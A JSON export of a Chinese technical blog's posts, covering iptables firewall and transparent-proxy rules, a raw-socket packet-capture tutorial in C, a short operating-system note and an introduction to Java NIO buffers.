DROP # iptables -A INPUT -i eth1 -p icmp --icmp-type echo-request -j DROP iptables -A INPUT -s 192.168.1.0/24 -p icmp --icmp-type echo-request -j ACCEPT ### ** assumed that default INPUT policy set to DROP ** ############# iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT iptables -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPT iptables -A INPUT -p icmp --icmp-type time-exceeded -j ACCEPT ## ** all our server to respond to pings ** ## iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT 打log先照上面的做法把facebook给封了（所有发到facebook的包全部drop，只是我们这一次想要看日志） iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j LOG --log-prefix &quot;IP_SPOOF A: &quot; iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j DROP 我们可以简单地使用下面的命令启用iptables的日志记录。 $ iptables -A INPUT -j LOG 我们还可以定义哪些日志将被创建的源IP或范围。 $ iptables -A INPUT -s 192.168.10.0/24 -j LOG 定义我们的iptables -log 生成的日志级别。 $ iptables -A INPUT -s 192.168.10.0/24 -j LOG --log-level 4 我们还可以添加一些前缀生成的日志，所以它会很容易在一个巨大的文件中搜索日志。 $ iptables -A INPUT -s 192.168.10.0/24 -j LOG --log-prefix &#39;** SUSPECT **&#39; 在Ubuntu和Debianiptables的日志由内核生成的。因此，检查以下内核日志文件。查看iptables的日志$ tailf /var/log/kern.log 只开7000-7010端口,只允许某个网段的ip发请求iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 7000:7010 -j ACCEPT ## only accept connection to tcp port 80 (Apache) if ip is between 192.168.1.100 and 192.168.1.200 ## iptables -A INPUT -p tcp --destination-port 80 -m iprange --src-range 192.168.1.100-192.168.1.200 -j ACCEPT ## nat example ## iptables -t nat -A POSTROUTING -j SNAT --to-source 192.168.1.20-192.168.1.25 Replace ACCEPT with DROP to block port: ## open port ssh tcp port 22 ## iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 22 -j ACCEPT ## open cups (printing service) udp/tcp port 631 for LAN users ## iptables -A INPUT -s 192.168.1.0/24 -p udp -m udp --dport 631 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -p tcp -m tcp --dport 631 -j ACCEPT ## allow time sync via NTP for lan users (open udp port 123) ## iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p udp --dport 123 -j ACCEPT ## open tcp port 25 (smtp) for all ## iptables -A INPUT -m state --state NEW -p tcp --dport 25 -j ACCEPT # open dns server ports for all ## iptables -A INPUT -m state --state NEW -p udp --dport 53 -j ACCEPT iptables -A INPUT -m state --state NEW -p tcp --dport 53 -j ACCEPT ## open http/https (Apache) server port to all ## iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT iptables -A INPUT -m state --state NEW -p tcp --dport 443 -j ACCEPT ## open tcp port 110 (pop3) for all ## iptables -A INPUT -m state --state NEW -p tcp --dport 110 -j ACCEPT ## open tcp port 143 (imap) for all ## iptables -A INPUT -m state --state NEW -p tcp --dport 143 -j ACCEPT ## open access to Samba file server for lan users only ## iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 137 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 138 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 139 -j ACCEPT iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 445 -j ACCEPT ## open access to proxy server for lan users only ## iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport 3128 -j ACCEPT ## open access to mysql server for lan users only ## iptables -I INPUT -p tcp --dport 3306 -j ACCEPT 限制最大连接数To allow 3 ssh connections per client host, enter:(一个client最多能够连3个ssh连接过来) # iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j REJECT http端口一个client最多20个连接 # iptables -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 24 -j DROP 使用iptables阻止syn-flood一般在路由器里面都有这么一条 iptables -N syn-flood iptables -A syn-flood -m limit --limit 50/s --limit-burst 10 -j RETURN iptables -A syn-flood -j DROP iptables -I INPUT -j syn-flood -N 创建一个条新的链 --limit 50/s 表示每秒50次;1/m 则为每分钟一次 --limit-burst 表示允许触发 limit 限制的最大包个数 (预设5)，它就像是一个容器，最多装10个，超过10个就装不下了，这些包就给后面的规则了 -I INPUT -j syn-flood 把INPUT的包交给syn-flood链处理 这里的--limit-burst=10相当于说最开始有10个可以匹配的包去转发，然后匹配的包的个数是根据--limit=50/s进行限制的，也就是每秒限制转发50个数据包，多余的会被下面符合要求的DROP规则去处理，进行丢弃，这样就实现了对数据包的限速问题。 现在来看看fail2ban是怎么拉黑一个ip的一般来说要拒绝一个ip访问http,https可以这么干 iptables -L INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 80 -j DROP iptables -L INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 443 -j DROP 而事实上就是创建了一个action ~ cat /etc/fail2ban/action.d/iptables.conf # Option: actionban # Notes.: command executed when banning an IP. Take care that the # command is executed with Fail2Ban user rights. # Tags: See jail.conf(5) man page # Values: CMD # actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt; REDIRECT (透明代理)首先来看一个把所有走网卡eth0的数据包都转发到redSocks的规则 // 新建路由转发表中的一个链 REDSOCKS sudo iptables -t nat -N REDSOCKS // 设置不需要代理转发的网段 // 目的为墙外代理服务器的数据包一定不能转发 sudo iptables -t nat -A REDSOCKS -d $SS_SERVER_IP -j RETURN // 目的为局域网和本地回环地址的数据包不用转发 sudo iptables -t nat -A REDSOCKS -d 172.0.0.0/24 -j RETURN sudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN // 将数据包转发到 redsocks sudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 // 将 REDSOCKS 链的规则应用到经过 eth0 网卡的数据包 sudo iptables -t nat -A OUTPUT -p tcp -o eth0 -j REDSOCKS 经常会看到教程如何把一台局域网linux nas或者虚拟机变成软路由的教程，首先需要设备开启ip转发 cat /proc/sys/net/ipv4/ip_forward 1 // 这个值默认是0 比方说把所有incoming 流量(目标端口是80的)导向8080端口 iptables -t nat -I PREROUTING --src 0/0 --dst 192.168.1.5 -p tcp --dport 80 -j REDIRECT --to-ports 8080 然后根据v2ray的配置文件设置透明代理。再接下来把所有nat表上的流量交给v2ray监听的端口 openwrt在/etc/firewall.user中添加如下脚本，实现本地透明代理（其实并不完美） ```sh iptables -t nat -N V2RAY //在nat这个表里面创建一个V2RAY的chain iptables -t nat -A V2RAY -d x.x.x.x -j RETURN ##xxx是vps的ip地址 iptables -t nat -A V2RAY -d 0.0.0.0/8 -j RETURN iptables -t nat -A V2RAY -d 10.0.0.0/8 -j RETURN iptables -t nat -A V2RAY -d 127.0.0.0/8 -j RETURN iptables -t nat -A V2RAY -d 169.254.0.0/16 -j RETURN iptables -t nat -A V2RAY -d 172.16.0.0/12 -j RETURN iptables -t nat -A V2RAY -d 192.168.0.0/16 -j RETURN iptables -t nat -A V2RAY -d 224.0.0.0/4 -j RETURN iptables -t nat -A V2RAY -d 240.0.0.0/4 -j RETURN iptables -t nat -A V2RAY -p tcp -j REDIRECT --to-ports 1060 iptables -t nat -A PREROUTING -p tcp -j V2RAY //下面是把所有的udp包导到1080端口，为什么这么写我不知道 ip rule add fwmark 1 table 100 ip route add local 0.0.0.0/0 dev lo table 100 iptables -t mangle -N V2RAY_MASK iptables -t mangle -A V2RAY_MASK -d 192.168.0.0/16 -j RETURN iptables -t mangle -A V2RAY_MASK -p udp -j TPROXY --on-port 1080 --tproxy-mark 1 iptables -t mangle -A PREROUTING -p udp -j V2RAY_MASK 亲测，透明代理的效果是可以的。只是比不上在windows上的速度,cpu占用达到50%以上，没什么意思。 相比起来,shadowsocks-libev给出了这样一份transparent proxy的代码，更加清楚 # Create new chain iptables -t nat -N SHADOWSOCKS iptables -t mangle -N SHADOWSOCKS # Ignore your shadowsocks server&#39;s addresses # It&#39;s very IMPORTANT, just be careful. iptables -t nat -A SHADOWSOCKS -d 123.123.123.123 -j RETURN # Ignore LANs and any other addresses you&#39;d like to bypass the proxy # See Wikipedia and RFC5735 for full list of reserved networks. # See ashi009/bestroutetb for a highly optimized CHN route list. iptables -t nat -A SHADOWSOCKS -d 0.0.0.0/8 -j RETURN iptables -t nat -A SHADOWSOCKS -d 10.0.0.0/8 -j RETURN iptables -t nat -A SHADOWSOCKS -d 127.0.0.0/8 -j RETURN iptables -t nat -A SHADOWSOCKS -d 169.254.0.0/16 -j RETURN iptables -t nat -A SHADOWSOCKS -d 172.16.0.0/12 -j RETURN iptables -t nat -A SHADOWSOCKS -d 192.168.0.0/16 -j RETURN iptables -t nat -A SHADOWSOCKS -d 224.0.0.0/4 -j RETURN iptables -t nat -A SHADOWSOCKS -d 240.0.0.0/4 -j RETURN # Anything else should be redirected to shadowsocks&#39;s local port iptables -t nat -A SHADOWSOCKS -p tcp -j REDIRECT --to-ports 12345 # Add any UDP rules ip route add local default dev lo table 100 ip rule add fwmark 1 lookup 100 iptables -t mangle -A SHADOWSOCKS -p udp --dport 53 -j TPROXY --on-port 12345 --tproxy-mark 0x01/0x01 # Apply the rules iptables -t nat -A PREROUTING -p tcp -j SHADOWSOCKS iptables -t mangle -A PREROUTING -j SHADOWSOCKS # Start the shadowsocks-redir ss-redir -u -c /etc/config/shadowsocks.json -f /var/run/shadowsocks.pid 代理的原理:参考ss/ssr/v2ray/socks5 透明代理里面的解释 ss-redir 是 ss-libev、ssr-libev 中的一个工具，配合 iptables 可以在 Linux 上实现 ss、ssr 透明代理，ss-redir 的透明代理是通过 DNAT 实现的，但是 udp 包在经过 DNAT 后会无法获取原目的地址，所以 ss-redir 无法代理经过 DNAT 的 udp 包；但是 ss-redir 提供了另一种 udp 透明代理方式：xt_TPROXY 内核模块（不涉及 NAT 操作），配合 iproute2 即可实现 udp 的透明代理，但缺点是只能代理来自内网主机的 udp 流量。强调一点，利用 ss-redir 实现透明代理必须使用 ss-libev 或 ssr-libev，python、go 等实现版本没有 ss-redir、ss-tunnel 程序。当然，ss、ssr 透明代理并不是只能用 ss-redir 来实现，使用 ss-local + redsocks/tun2socks 同样可以实现 socks5（ss-local 是 socks5 服务器）全局透明代理，ss-local + redsocks 实际上是 ss-redir 的分体实现，都是通过 NAT 进行代理的，因此也不能代理本机的 udp，当然内网的 udp 也不能代理，因为 redsocks 不支持 xt_TPROXY 方式（redsocks2 支持 TPROXY 模块，但是依旧无法代理本机 udp，不考虑）。所以这里只讨论 ss-local + tun2socks，这个组合方式其实和 Android 上的 VPN 模式差不多（ss-redir 或 ss-local + redsocks 则是 NAT 模式），因为不涉及 NAT 操作，所以能够代理所有 tcp、udp 流量（包括本机、内网的 udp）。很显然，利用 tun2socks 可以实现任意 socks5 透明代理（不只是 ss/ssr，ssh、v2ray 都可以，只要能提供 socks5 本地代理）。最后再说一下 v2ray 的透明代理，其实原理和 ss/ssr-libev 一样，v2ray 可以看作是 ss-local、ss-redir、ss-tunnel 三者的合体，因为一个 v2ray 客户端可以同时充当这三个角色（当然端口要不一样）；所以 v2ray 的透明代理也有两种实现方式，一是利用对应的 ss-redir/ss-tunnel + iptables，二是利用对应的 ss-local + tun2socks（这其实就是前面说的 socks5 代理）。 shell中全局的http代理可以这么设置 export http_proxy=http://127.0.0.1:8118; export https_proxy=$http_proxy //如果是socks5协议的话可以改一下 export http_proxy=socks5://127.0.0.1:8118; export https_proxy=$http_proxy //只对当前shell有效 接下来，git、curl、wget 等命令会自动从环境变量中读取 http 代理信息，然后通过 http 代理连接目的服务器。但有些软件是不认这个的。那问题来了，ss-local 提供的是 socks5 代理，不能直接使用怎么办？也简单，Linux 中有很多将 socks5 包装为 http 代理的工具，比如 privoxy。只需要在 /etc/privoxy/config 里面添加一行 forward-socks5 / 127.0.0.1:1080 .，启动 privoxy，默认监听 127.0.0.1:8118 端口，注意别搞混了，8118 是 privoxy 提供的 http 代理地址，而 1080 是 ss-local 提供的 socks5 代理地址，发往 8118 端口的数据会被 privoxy 处理并转发给 ss-local。所以我们现在可以执行 export http_proxy=http://127.0.0.1:8118; export https_proxy=$http_proxy 来配置当前终端的 http 代理，这样 git、curl、wget 这些就会自动走 ss-local 出去了。 Often, services on the computer communicate with each other by sending network packets to each other. They do this by utilizing a pseudo network interface called the loopback device, which directs traffic back to itself rather than to other computers.同一台机器的不同进程之间有时候是通过一个虚拟的网络(loopback device)进行通信的，所以，必须要让iptables允许这些通信$ sudo iptables -I INPUT 1 -i lo -j ACCEPT // -I的意思是插入，就是插入到INPUT这个规则里面。 1是说插到第一位，因为iptables排在前面的优先级高。 -i是interface的意思，lo就是loopback的简称。（也就是说，所有使用本地loopback这个interface发过来的包，放行） 注意还需要将上述规则添加到开机启动中，想要持久化的话好像有一个iptables-persistent，还有使用iptables屏蔽来自某个国家的IP的教程 透明代理的实现ss-liibev的openwrt移植就是这么干的在ss-rules(其实就是一个shell脚本)中 ipset -! restore create ss_spec_src_fw hash:ip hashsize 64 iptables-restore -n &lt;&lt;-EOF nat -A SS_SPEC_LAN_AC -m set --match-set ss_spec_src_fw src -j SS_SPEC_WAN_FW -A SS_SPEC_WAN_AC -m set --match-set ss_spec_dst_fw dst -j SS_SPEC_WAN_FW EOF ## 这个EOF主要为了方便换行，match src是gfwlist的转到SS_SPEC_WAN_FW这个chain上(外面的流量进来)，dst是gfwlist的也转到这个chain上。 ## 而这个chain 只干了一件事 REDIRECT tcp -- anywhere anywhere redir ports 1080(比方说local ss-redir监听在这个端口的话) iptables -t nat -A SS_SPEC_WAN_FW -p tcp \\ -j REDIRECT --to-ports $local_port //tcp流量导向ss-redir本地监听端口 iptables -t mangle -A SS_SPEC_WAN_FW -p udp \\ -j TPROXY --on-port $LOCAL_PORT --tproxy-mark 0x01/0x01 //udp转发 UDP 透明代理是通过 TPROXY 方式实现的 TPROXY是LINUX内核为支持透明代理而提供的一项新技术。所以在部署了ss-libev-luci的路由器上iptables -t nat -L 都能看到这些东西。事实上在iptables没有看到udp的影子，使用的是TPROXY。ss-redir的原理很简单：使用iptables对PREROUTING与OUTPUT的TCP/UDP流量进行REDIRECT（REDIRECT是DNAT的特例），ss—redir在捕获网络流量后，通过一些技术手段获取REDIRECT之前的目的地址（dst）与端口（port），连同网络流量一起转发至远程服务器。为了在redirect UDP后还能够获取原本的dst和port，ss-redir采用了TPROXY。Linux系统有关TPROXY的设置是以下三条命令： ip rule add fwmark 0x2333/0x2333 pref 100 table 100 ip route add local default dev lo table 100 iptables -t mangle -A PREROUTING -p udp -j TPROXY --tproxy-mark 0x2333/0x2333 --on-ip 127.0.0.1 --on-port 1080 大意就是在mangle表的PREROUTING中为每个UDP数据包打上0x2333/0x2333标志，之后在路由选择中将具有0x2333/0x2333标志的数据包投递到本地环回设备上的1080端口；对监听0.0.0.0地址的1080端口的socket启用IP_TRANSPARENT标志，使IPv4路由能够将非本机的数据报投递到传输层，传递给监听1080端口的ss-redir。 ipset的语法就是一大堆ip的一个集合，但是存的是hash。 iptables的参数可以传 -m –match-set netfilter是kernel的实现 Iptables is a standard firewall included in most Linux distributions by default (a modern variant called nftables will begin to replace it). It is actually a front end to the kernel-level netfilter hooks that can manipulate the Linux network stack. iptables的工作流程 direct the packet to the appropriate chain, check it against each rule until one matches, issue the default policy of the chain if no match is found a-deep-dive-into-iptables-and-netfilter-architecture iptable在透明代理中的原理就是修改了packet的destination address，同时还记住了原来的address iptables overwrites the original destination address but it remembers the old one. The application code can then fetch it by asking for a special socket option, SO_ORIGINAL_DST著名tcp代理redsocks就是用SO_ORIGINAL_DST的 参考linux-iptables-examples网件R7800 OpenWrt使用V2Ray+mKcp+透明代理完美翻墙","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"原始套接字学习指南","date":"2019-01-19T22:20:35.000Z","path":"2019/01/19/2019-01-19-learning-from-raw-socket/","text":"从原始套接字 SOCK_RAW学习到的知识 以下图片盗自chinaunix一篇讲解raw socket的文章，感谢原作者的辛勤工作。复习一下ip包的结构。 这是IP packet 这是TCP header 这是IP header 这是mac header 从内核代码来看，这些分别对应ethhdr、iphdr、tcphdr、udphdr等结构体。 一般来讲，应用层程序的数据都是在tcp或者udp的data中的，实际发送过程中，内核会帮忙添加上tcp header，ip header以及mac header等数据，开发者无需关心也无从干涉。raw socket为我们提供了直接读写这块数据的方法。 C语言中raw socket的创建方式为: socket(AF_INET, SOCK_RAW, protocol); //需要root权限 raw socket一般用于网络监测程序中比较多，比如ping , nmap这种。这类协议是没有端口的。 另一种场景是伪造tcp header应对运营商udp屏蔽和流量qos，这种类似的实现在2017年出来的比较多。(就是用一个raw socket把一个udp包伪装成一个tcp包)。 接下来这个例子是使用raw socket监听server端收到的ip packet包内容server.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;linux/if_ether.h&gt; #include &lt;stdlib.h&gt; #include &lt;arpa/inet.h&gt; int main() { printf(&quot;main is running\\n&quot;); int iSock, nRead, iProtocol; char buffer[4096] = {0}; char *ethhead, *iphead, *tcphead, *udphead, *icmphead, *p; if((iSock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) &lt; 0) { printf(&quot;create iSocket error, check root\\n&quot;); // 需要root权限， 最后运行的时候， 可以用sudo ./server return 1; } while(1) { nRead = recvfrom(iSock, buffer, 2048, 0, NULL, NULL); /* 以太网帧头 14 ip头 20 udp头 8 总共42字节(最少) */ if(nRead &lt; 42) { printf(&quot;packet error\\n&quot;); continue; } int n = 0XFF; char szVisBuf[1024] = {0}; for(unsigned int i = 0; i &lt; nRead; ++i) { char szTmp[3] = {0}; sprintf(szTmp, &quot;%02x&quot;, buffer[i]&amp;n); strcat(szVisBuf, szTmp); } ethhead = buffer; p = ethhead; iphead = ethhead + 14; p = iphead + 12; char szIps[128] = {0}; snprintf(szIps, sizeof(szIps), &quot;IP: %d.%d.%d.%d =&gt; %d.%d.%d.%d&quot;, p[0]&amp;n, p[1]&amp;n, p[2]&amp;n, p[3]&amp;n, p[4]&amp;n, p[5]&amp;n, p[6]&amp;n, p[7]&amp;n); iProtocol = (iphead + 9)[0]; p = iphead + 20; unsigned int iDstPort = (p[2]&lt;&lt;8)&amp;0xff00 | p[3]&amp;n; switch(iProtocol) { case IPPROTO_UDP : if(iDstPort == 8888) { printf(&quot;source port: %u,&quot;,(p[0]&lt;&lt;8)&amp;0xff00 | p[1]&amp;n); printf(&quot;dest port: %u\\n&quot;, iDstPort); printf(&quot;%s\\n&quot;, szIps); printf(&quot;%s\\n&quot;, szVisBuf); printf(&quot;nRead is %d\\n&quot;, nRead); } break; case IPPROTO_RAW : printf(&quot;raw\\n&quot;); break; default: break; } } } client.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netinet/in.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;unistd.h&gt; int main() { struct sockaddr_in srvAddr; bzero(&amp;srvAddr, sizeof(srvAddr)); srvAddr.sin_family = AF_INET; srvAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); srvAddr.sin_port = htons(8888); int iSock = socket(AF_INET, SOCK_DGRAM, 0); // udp int i = 0; while(1) { printf(&quot;press enter to send data\\n&quot;); while (( i = getchar()) != &#39;\\n&#39;){ char szBuf[32] = {0}; snprintf(szBuf, sizeof(szBuf), &quot;hello %d&quot;, ++i); sendto(iSock, szBuf, strlen(szBuf) + 1, 0, (struct sockaddr *)&amp;srvAddr, sizeof(srvAddr)); } } close(iSock); return 0; } 从raw socket 接受过来的buffer 的地址是数据链路层的地址，具体我们获取的东西就是通过偏移量来，这个偏移量我们需要查看网络书或者抓个包分析下链路层的数据格式等等。client很简单，就是一个udp发包到localhost，关键在于server这边： iSock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP) 这个socket能够监听本机接收到的所有ip packet，接收到的数据帧的头6个字节是目的地的MAC地址，紧接着6个字节是源MAC地址 , 如果是udp或者tcp的话，还能读取到port。也就是一些常用抓包工具的实现原理。 所以可以写一个简单的抓包工具，将那些发给本机的IPV4报文全部打印出来。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;errno.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;netinet/in.h&gt; #include &lt;netinet/ip.h&gt; #include &lt;netinet/if_ether.h&gt; int main(int argc, char **argv) { int sock, n; char buffer[2048]; struct ethhdr *eth; struct iphdr *iph; if (0 &gt; (sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP)))) { perror(&quot;socket&quot;); exit(1); } while (1) { printf(&quot;=====================================\\n&quot;); //注意：在这之前我没有调用bind函数，raw socket这一层已经不存在port的概念了 n = recvfrom(sock, buffer, 2048, 0, NULL, NULL); printf(&quot;%d bytes read\\n&quot;, n); //接收到的数据帧头6字节是目的MAC地址，紧接着6字节是源MAC地址。 eth = (struct ethhdr*)buffer; printf(&quot;Dest MAC addr:%02x:%02x:%02x:%02x:%02x:%02x\\n&quot;,eth-&gt;h_dest[0],eth-&gt;h_dest[1],eth-&gt;h_dest[2],eth-&gt;h_dest[3],eth-&gt;h_dest[4],eth-&gt;h_dest[5]); printf(&quot;Source MAC addr:%02x:%02x:%02x:%02x:%02x:%02x\\n&quot;,eth-&gt;h_source[0],eth-&gt;h_source[1],eth-&gt;h_source[2],eth-&gt;h_source[3],eth-&gt;h_source[4],eth-&gt;h_source[5]); iph = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //我们只对IPV4且没有选项字段的IPv4报文感兴趣 if(iph-&gt;version == 4 &amp;&amp; iph-&gt;ihl == 5){ unsigned char *sd, *dd; sd = (unsigned char*)&amp;iph-&gt;saddr; dd = (unsigned char*)&amp;iph-&gt;daddr; printf(&quot;Source Host: %d.%d.%d.%d Dest host: %d.%d.%d.%d\\n&quot;, sd[0], sd[1], sd[2], sd[3], dd[0], dd[1], dd[2], dd[3]); // printf(&quot;Source host:%s\\n&quot;, inet_ntoa(iph-&gt;saddr)); // printf(&quot;Dest host:%s\\n&quot;, inet_ntoa(iph-&gt;daddr)); } } return 0; } 顺便提一下，一般我们在Linux机器上是可以查看到当前系统对应的内核的头文件的 root][~]# grep -n ‘ethhdr’ /usr/include/linux/if_ether.h107:struct ethhdr {[root][~]#[root][~]# grep -n ‘iphdr’ /usr/include/linux/*/usr/include/linux/if_tunnel.h:32: struct iphdr iph;/usr/include/linux/ip.h:85:struct iphdr { 从raw socket介绍中学到的东西 接下来我们简单介绍一下网卡是怎么收报的，如果你对这部分已经很了解可以跳过这部分内容。网卡从线路上收到信号流，网卡的驱动程序会去检查数据帧开始的前6个字节，即目的主机的MAC地址，如果和自己的网卡地址一致它才会接收这个帧，不符合的一般都是直接无视。然后该数据帧会被网络驱动程序分解，IP报文将通过网络协议栈，最后传送到应用程序那里。往上层传递的过程就是一个校验和“剥头”的过程，由协议栈各层去实现。 setsockopt (packet_send_sd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) // IP_HDRINCL to tell the kernel that headers are included in the packet这样设置告诉内核，ip packet的header将由我们自己添加，所以最终发送出去的内容需要完全由自己决定。 为了将一个udp包伪装成tcp包，需要一个SOCK_RAW的socket socket(AF_INET , SOCK_RAW , IPPROTO_TCP) 接下来就是自己组装tcp包结构，tbd(这个不同的网卡的值是不一样的，最简单的就是抓包就可以了) python也提供了对应rawsocket的api socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) 参考kcptun-raw：应对UDP QoS，重新实现kcptun的一次尝试some_kcptun_toolskcptun-rawtcp那些事 tcp协议为了对外实现可靠交付，内部实现有很多非常复杂的算法。","tags":[{"name":"c","slug":"c","permalink":"https://haldir65.github.io/tags/c/"}]},{"title":"操作系统原理","date":"2019-01-10T22:32:11.000Z","path":"2019/01/10/2019-01-10-operating-system-related-topics/","text":"操作系统原理的一些记录 操作系统是如何做好断电保护的？日志文件系统（journaling file system）是一个具有故障恢复能力的文件系统，在这个文件系统中，因为对目录以及位图的更新信息总是在原始的磁盘日志被更新之前写到磁盘上的一个连续的日志上，所以它保证了数据的完整性。当发生系统错误时，一个全日志文件系统将会保证磁盘上的数据恢复到发生系统崩溃前的状态。同时，它还将覆盖未保存的数据，并将其存在如果计算机没有崩溃的话这些数据可能已经遗失的位置，这是对关键业务应用来说的一个很重要的特性。 内存中段和分页的语义是什么参考从内核文件系统看文件读写过程计算机底层知识拾遗","tags":[{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"java nio使用指南","date":"2019-01-10T22:25:50.000Z","path":"2019/01/10/2019-01-10-java-nio-intro/","text":"关于java nio的一些点 本文大多数内容来自知乎专栏的复制粘贴，因为别人写的比我好 nio及DirectByteBuffer相关操作nio包含了很多东西，核心的应该是selectorDirectBuffer这个东西很容易讲，一句话就能说清楚：这是一块在Java堆外分配的，可以在Java程序中访问的内存。先来解释一下几个堆是什么。以32位系统为例（64位系统也是一样的，只是地址空间更大而已，写起来没有32位系统看上去那么简洁），操作系统会为一个进程提供4G的地址空间，换句话说，一个进程可用的内存是4G。在Linux上，又为内核空间留了1G，剩下的3G是可以供用户使用的(粗略来看是这样的)。这1G就叫做内核空间，3G被称为用户空间。一个java进程下不过对于操作系统而言，肯定是一个用户进程。所以jva也就有了这3G的使用权。jvm想要使用这些内存的时候，会使用malloc方法去找操作系统去要（其实中间还隔了一个C runtime，我们不去管这个细节，只把malloc往下都看成是操作系统的功能，并不会带来太大的问题）而JVM要来的这些的内存，有一块是专门供Java程序创建对象使用的，这块内存在JVM中被称为堆(heap)。堆这个词快被用烂了，操作系统有堆的概念，C runtime也有，JVM里也有，然后还有一种数据结构也叫堆.我们使用普通的ByteBuffer，那么这个ByteBuffer就会在Java堆内，被JVM所管理： ByteBuffer buf = ByteBuffer.allocate(1024); 在执行GC的时候，JVM实际上会做一些整理内存的工作，也就说buf这个对象在内存中的实际地址是会发生变化的。有些时候，ByteBuffer里都是大量的字节，这些字节在JVM GC整理内存时就显得很笨重，把它们在内存中拷来拷去显然不是一个好主意。那这时候，我们就会想能不能给我一块内存，可以脱离JVM的管理呢？在这样的背景下，就有了DirectBuffer。先看一下用法： ByteBuffer buf = ByteBuffer.allocateDirect(1024); 这两个函数的实现是有区别的: public static ByteBuffer allocateDirect(int capacity) { return new DirectByteBuffer(capacity); } public static ByteBuffer allocate(int capacity) { if (capacity &lt; 0) throw new IllegalArgumentException(); return new HeapByteBuffer(capacity, capacity); } DirectByteBuffer的核心就是调用了 unsafe.allocateMemory(size)方法。Java对象在Java堆里申请内存的时候，实际上是比malloc要快的，所以DirectBuffer的创建效率往往是比Heap Buffer差的。但是，如果进行网络读写或者文件读写的时候，DirectBuffer就会比较快了。 说起来好笑，这个快是因为JDK故意把非DirectBuffer的读写搞慢的，我们看一下JDK的源代码。share/classes/sun/nio/ch/IOUtil.java static int write(FileDescriptor fd, ByteBuffer src, long position, NativeDispatcher nd) throws IOException { if (src instanceof DirectBuffer) return writeFromNativeBuffer(fd, src, position, nd); // Substitute a native buffer int pos = src.position(); int lim = src.limit(); assert (pos &lt;= lim); int rem = (pos &lt;= lim ? lim - pos : 0); ByteBuffer bb = Util.getTemporaryDirectBuffer(rem); try { bb.put(src); bb.flip(); // ................略 如果src是DirectBuffer，就直接调用writeFromNativeBuffer，如果不是，则要先创建一个临时的DirectBuffer，把src拷进去，然后再调用真正的写操作。为什么要这么干呢？还是要从DirectBuffer不会被GC移动说起。writeFromNativeBuffer的实现，最终会把Buffer的address传给操作系统，让操作系统把address开始的那一段内存发送到网络上。这就要求在操作系统进行发送的时候，这块内存是不能动的(jni调用传递的是地址，地址不能乱动)。而我们知道，GC是会乱搬Java堆里的东西的，所以无奈，我们必须得弄一块地址不会变化的内存，然后把这个地址发给操作系统。 常用的ByteBuffer本质上是一个byte[]，包括这么几个变量容量（Capacity） 缓冲区能够容纳的数据元素的最大数量。容量在缓冲区创建时被设定，并且永远不能被改变。上界（Limit） 缓冲区里的数据的总数，代表了当前缓冲区中一共有多少数据。位置（Position） 下一个要被读或写的元素的位置。Position会自动由相应的 get( )和 put( )函数更新。标记（Mark） 一个备忘位置。用于记录上一次读写的位置。一会儿，我会通过reset方法来说明这个属性的含义。ByteBuffer是一个抽象类，不能new出来 ByteBuffer byteBuffer = ByteBuffer.allocate(256); 以上的语句可以创建一个大小为256字节的ByteBuffer，此时，mark = -1, pos = 0, limit = 256, capacity = 256。capacity在初始化的时候确定了，运行时就不会再变化了，而另外三个变量是随着程序的执行而不断变化的。 由于本质上就是一个byte[]，读数据的时候position放到0, limit放到当前已经存放的数据的位置，读完为止。写数据的时候也差不多，position放到当前已经存放的数据的curIndex+1，limit放到capicity的位置，填满为止。 从读变成写可以这么干 byteBuffer.limit(byteBuffer.position()) byteBuffer.position(0); //由于这个方法实在太频繁,jdk就帮忙封装了一个叫做flip的方法 public final Buffer flip() { limit = position; position = 0; mark = -1; return this; } 显然连续调用flip会导致limit变成0，不能读也不能写了。mark方法类似于打一个标记，待会儿通过reset回到这个position。 java的byte数组在内存层面不一定是连续的，C语言里面是连续的原因是GC会挪动内存 nio的channel在Java IO中，基本上可以分为文件类和Stream类两大类。Channel 也相应地分为了FileChannel 